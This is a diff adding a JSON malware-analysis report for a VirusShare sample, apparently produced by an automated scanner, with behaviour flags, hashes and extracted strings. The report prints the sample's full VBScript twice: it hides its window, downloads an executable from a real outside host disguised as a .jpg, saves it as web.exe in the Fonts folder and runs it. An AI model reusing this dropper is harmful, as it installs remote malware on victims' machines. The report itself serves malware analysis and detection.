@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Msxml2.XMLHTTP": "May download files from the Internet",
+            "Open": "May open a file",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Write": "May write to a file",
+            "chr": "May attempt to obfuscate specific str",
+            "run": "May run an executable file or a system command",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "<script language=\"vbs\">\nself.MoveTo 4998,4989\nSet shell=CreateObject(\"WScript.Shell\")\nddd = shell.SpecialFolders(\"Fonts\") + \"\\\" + \"web.exe\"\nset dot=CreateObject(\"Msxml2.XMLHTTP\")\ndot.Open \"GET\", \"http://photo.matrix.net.hk/~rlcw/www/pic10.jpg\", false\nWScript.Sleep(300)\ndot.Send()\ncs = dot.responseBody\nSet fso = CreateObject(\"Script\"+\"ing\".\".FileSystemObject\")\nSet f = fso.CreateTextFile(ddd)\nfor i = 0 to UBound(cs)\nc = ascb(midb(cs, i+1, 1))\nf.Write chr(c)\nnext\nf.close\nshell.run(ddd)\nwindow.close()\n</script>"
+    },
+    "filename": "VirusShare_1bbb3acc93629fe110da62c00461d5c1",
+    "filesize": 530,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1bbb3acc93629fe110da62c00461d5c1",
+        "sha1": "5a553f72cc97ae4887df279e5bdff6f279f3b561",
+        "sha256": "3d6e661c7c28b0467501ef6c8514e5ab297d3628a3cd19c15e04cbf8e4fc9641"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<script language=\"vbs\">",
+            "self.MoveTo 4998,4989",
+            "Set shell=CreateObject(\"WScript.Shell\")",
+            "ddd = shell.SpecialFolders(\"Fonts\") + \"\\\" + \"web.exe\"",
+            "set dot=CreateObject(\"Msxml2.XMLHTTP\")",
+            "dot.Open \"GET\", \"http://photo.matrix.net.hk/~rlcw/www/pic10.jpg\", false",
+            "WScript.Sleep(300)",
+            "dot.Send()",
+            "cs = dot.responseBody",
+            "Set fso = CreateObject(\"Script\"+\"ing\".\".FileSystemObject\")",
+            "Set f = fso.CreateTextFile(ddd)",
+            "for i = 0 to UBound(cs)",
+            "c = ascb(midb(cs, i+1, 1))",
+            "f.Write chr(c)",
+            "next",
+            "f.close",
+            "shell.run(ddd)",
+            "window.close()",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://photo.matrix.net.hk/~rlcw/www/pic10.jpg"
+        ]
+    },
+    "time": "0:00:00.255754",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
